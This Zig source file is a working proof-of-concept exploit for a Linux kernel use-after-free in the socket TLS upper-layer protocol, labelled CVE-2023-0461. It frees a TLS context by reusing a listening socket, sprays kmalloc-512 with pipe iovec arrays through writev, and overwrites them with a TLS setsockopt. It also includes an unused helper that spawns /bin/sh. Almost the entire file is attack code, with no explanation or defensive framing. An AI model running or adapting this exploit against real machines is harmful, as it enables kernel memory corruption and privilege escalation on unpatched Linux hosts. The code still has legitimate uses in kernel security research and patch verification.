const std = @import("std");
const assert = std.debug.assert;
const log = std.log;
const net = std.net;
const os = std.os;
const errno = os.errno;
const l = os.linux;
const E = l.E;
const mem = std.mem;
const Allocator = mem.Allocator;

const SOL = struct {
    pub const TCP = 6;
};

const TLS = struct {
    pub const TX = 1;
    pub const RX = 2;
};

const F = struct {
    pub const SETPIPE_SZ = 1024 + 7;
};

const CipherType = enum(u16) {
    AESGCM128 = 51,
};

const Version = enum(u16) {
    TLS12 = 0x0303,
    TLS13 = 0x0304,
};

const TLSCryptoInfo = extern struct {
    version: Version,
    cipher_type: CipherType,
};

const AESGCM128 = extern struct {
    info: TLSCryptoInfo,
    iv: [8]u8,
    key: [16]u8,
    salt: [4]u8,
    rec_seq: [8]u8,
};

comptime {
    assert(@sizeOf(AESGCM128) == 40);
}

const TLSProtInfo = extern struct {
    version: Version,
    cipher_type: CipherType,
    prepend_size: u16,
    tag_size: u16,
    overhead_size: u16,
    iv_size: u16,
    salt_size: u16,
    rec_seq_size: u16,
    aad_size: u16,
    tail_size: u16,
};

comptime {
    assert(@sizeOf(TLSProtInfo) == 20);
}

const TLSContext = extern struct {
    prot_info: TLSProtInfo,
};

// Zig std library doesn't consider possiblity of setting iov_base to null
const iovec_const = extern struct {
    iov_base: ?[*]const u8,
    iov_len: usize,
};

pub fn writev(fd: os.fd_t, iov: []const iovec_const) os.WriteError!usize {
    const iov_count = @as(u31, @intCast(iov.len));
    while (true) {
        const rc = l.syscall3(.writev, @as(usize, @bitCast(@as(isize, fd))), @intFromPtr(&iov), iov_count);
        switch (errno(rc)) {
            .SUCCESS => return @as(usize, @intCast(rc)),
            .INTR => continue,
            .INVAL => return error.InvalidArgument,
            .FAULT => unreachable,
            .AGAIN => return error.WouldBlock,
            .BADF => return error.NotOpenForWriting, // Can be a race condition.
            .DESTADDRREQ => unreachable, // `connect` was never called.
            .DQUOT => return error.DiskQuota,
            .FBIG => return error.FileTooBig,
            .IO => return error.InputOutput,
            .NOSPC => return error.NoSpaceLeft,
            .PERM => return error.AccessDenied,
            .PIPE => return error.BrokenPipe,
            .CONNRESET => return error.ConnectionResetByPeer,
            .BUSY => return error.DeviceBusy,
            else => |err| return os.unexpectedErrno(err),
        }
    }
}

fn retry_connect(sock: os.socket_t, sock_addr: *const os.sockaddr, len: os.socklen_t) !void {
    var n: u8 = 100;
    var last_err: os.ConnectError = undefined;

    while (n > 0) : (n -= 1) {
        os.connect(sock, sock_addr, len) catch |err| {
            last_err = err;
            os.nanosleep(0, 100000);

            continue;
        };

        return;
    }

    return last_err;
}

const Direction = enum(u32) {
    TX = TLS.TX,
    RX = TLS.RX,
};

fn setTLSOpt(sk: os.socket_t, dir: Direction) !void {
    const crypto = AESGCM128{
        .info = .{
            .version = .TLS13,
            .cipher_type = .AESGCM128,
        },
        .iv = .{ 'i', 'v' } ** 4,
        .key = .{ 'k', 'y' } ** 8,
        .salt = .{ 's', 'a', 'l', 't' },
        .rec_seq = .{ 'r', 's' } ** 4,
    };

    try os.setsockopt(sk, l.SOL.TLS, @intFromEnum(dir), mem.asBytes(&crypto));
}

const SyncPipe = struct {
    const Self = @This();

    pipe: [2]os.fd_t,

    pub fn init() !Self {
        return .{
            .pipe = try os.pipe(),
        };
    }

    pub fn deinit(self: Self) void {
        os.close(self.pipe[0]);
        os.close(self.pipe[1]);
    }

    pub fn wait(self: Self, on: u8) !void {
        var buf = [_]u8{0x00};
        _ = try os.read(self.pipe[0], &buf);

        if (buf[0] != on)
            return error.desync;
    }

    pub fn cont(self: Self, on: u8) !void {
        _ = try os.write(self.pipe[1], &.{on});
    }
};

fn sh() !void {
    const allc = std.heap.page_allocator;
    var child = std.process.Child.init(&[_][]const u8{"/bin/sh"}, allc);

    _ = try child.spawnAndWait();
}

fn cve_2023_0461() !void {
    const server_addr = try net.Ip4Address.parse("127.0.0.1", 0xf00b);
    const server_addr_p: *const l.sockaddr = @ptrCast(&server_addr.sa);
    const target_addr = try net.Ip4Address.parse("127.0.0.1", 0xdead);
    const target_addr_p: *const l.sockaddr = @ptrCast(&target_addr.sa);
    const unspec_addr = l.sockaddr{ .family = l.AF.UNSPEC, .data = undefined };
    const addr_sz = @sizeOf(@TypeOf(server_addr.sa));

    const spray = try os.pipe();
    _ = try os.fcntl(spray[0], F.SETPIPE_SZ, mem.page_size);
    _ = try os.fcntl(spray[1], F.SETPIPE_SZ, mem.page_size);

    const sync = try SyncPipe.init();
    defer sync.deinit();

    const target_sk = try os.socket(os.AF.INET, os.SOCK.STREAM, 0);
    defer os.closeSocket(target_sk);

    const child_pid = try os.fork();

    if (child_pid == 0) {
        log.info("child: listen for first connection", .{});
        {
            const server_sk = try os.socket(os.AF.INET, os.SOCK.STREAM, 0);
            defer os.closeSocket(server_sk);

            try os.bind(server_sk, server_addr_p, addr_sz);
            try os.listen(server_sk, 1);
            try sync.cont(0);

            const client_sk = try os.accept(server_sk, null, null, 0);
            os.closeSocket(client_sk);
        }

        log.info("child: connect for second connection", .{});
        const client_sk = try os.socket(os.AF.INET, os.SOCK.STREAM, 0);
        defer os.closeSocket(client_sk);
        try sync.wait(1);
        try retry_connect(client_sk, target_addr_p, addr_sz);
        try sync.wait(2);

        os.nanosleep(5, 0);
        log.info("child: unblock parent", .{});

        {
            var buf: [256]u8 = .{0x41} ** 256;
            const len = try os.read(spray[0], &buf);

            log.info("child: read {}: {s}", .{ len, std.fmt.fmtSliceEscapeLower(buf[0..len]) });
        }

        log.info("child: try overwrite iovec", .{});
        try setTLSOpt(target_sk, .RX);

        {
            var buf: [256]u8 = .{0x42} ** 256;
            const len = try os.read(spray[0], &buf);

            log.info("child: read {}: {s}", .{ len, std.fmt.fmtSliceEscapeLower(buf[0..len]) });
        }

        try sync.cont(3);

        return;
    }

    defer _ = os.waitpid(child_pid, 0);
    log.info("parent: connect for first connection", .{});

    try sync.wait(0);
    try retry_connect(target_sk, server_addr_p, addr_sz);
    try os.setsockopt(target_sk, SOL.TCP, l.TCP.ULP, "tls");

    try os.connect(target_sk, &unspec_addr, @sizeOf(@TypeOf(unspec_addr)));
    try os.bind(target_sk, target_addr_p, addr_sz);

    log.info("parent: listen for second connection", .{});

    try os.listen(target_sk, 1);
    try sync.cont(1);

    const client_sk = try os.accept(target_sk, null, null, 0);
    log.info("parent: free the context", .{});
    os.closeSocket(client_sk);
    try sync.cont(2);

    log.info("parent: wait for deferred free", .{});
    os.nanosleep(5, 0);

    // 17 * 16 = 272 > 256 so that we are in kmalloc-512
    const overwritten = [_]u8{ 'n', 'o', 'p', 'e' } ** 64;
    const iov_zero = [1]iovec_const{.{ .iov_base = null, .iov_len = 0 }};
    const iov_dummy = [1]iovec_const{.{
        .iov_base = &overwritten,
        .iov_len = overwritten.len,
    }};
    const iov: [17]iovec_const =
        iov_dummy ++
        (iov_zero ** 2) ++
        iov_dummy ++
        (iov_zero ** 13);

    {
        const len = try writev(spray[1], &iov);
        if (len != 512)
            log.err("parent: {} != 512", .{len});
    }

    try sync.wait(3);

    log.info("Goodbye!", .{});
}

pub fn main() !void {
    try cve_2023_0461();
}
